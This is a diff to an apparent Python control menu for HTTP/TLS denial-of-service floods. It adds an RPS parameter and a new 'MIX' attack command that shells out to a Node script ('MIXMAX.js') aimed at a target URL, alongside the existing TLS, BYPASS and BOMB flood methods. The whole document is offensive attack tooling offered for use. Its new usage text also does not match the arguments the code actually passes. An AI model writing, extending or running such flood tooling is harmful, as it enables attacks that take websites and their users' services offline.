@@ -51,7 +51,7 @@ def layer7():
 \033[96m              ╚╦════════════════════════════════════════════╦╝
 \033[96m         ╔═════╩════════════════════════════════════════════╩═════╗
 \033[0m           NOTE USE : GET/POST
-\033[94m           [ THREAD 500/150 ]
+\033[94m           [ THREAD 500/150 ]   [ RPS 2/5 ]
 \033[94m           [ TIME 50/150 ]
 \033[94m           [ RATE 12/32 ]
 \033[96m         ╚════════════════════════════════════════════════════════╝
@@ -63,6 +63,7 @@ def layer7():
 \033[95m           - TLS   [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRATE\033[95m] [\033[92mTHREAD\033[95m]
 \033[95m           - BYPASS [\033[92mURL\033[95m] [\033[92mTHREAD\033[95m] [\033[92mTIME\033[95m]
 \033[95m           - BOMB [\033[92mURL\033[95m] [\033[92mTHREAD\033[95m] [\033[92mTIME\033[95m]
+\033[95m           - MIX [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRPS\033[95m] [\033[92mTHREADS\033[95m]
 \033[96m         ╚════════════════════════════════════════════════════════╝
 
 ''')
@@ -178,6 +179,17 @@ def main():
                 print('\n')
                 print('Usage: BYPASS <url> METHODS<GET/POST>')
                 print('Example: BYPASS http://example.com 1500 200')
+                print('\n')
+
+        elif "MIX" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                os.system(f'node MIXMAX.js -site {url} -data {method}')
+            except IndexError:
+                print('\n')
+                print('Usage: MIX <HOST> <TIME> <RPS> <THREADS>')
+                print('Example: MIX http://example.com 244 5 150')
                 print('\n')
 
         elif "TLSV2" in cnc:
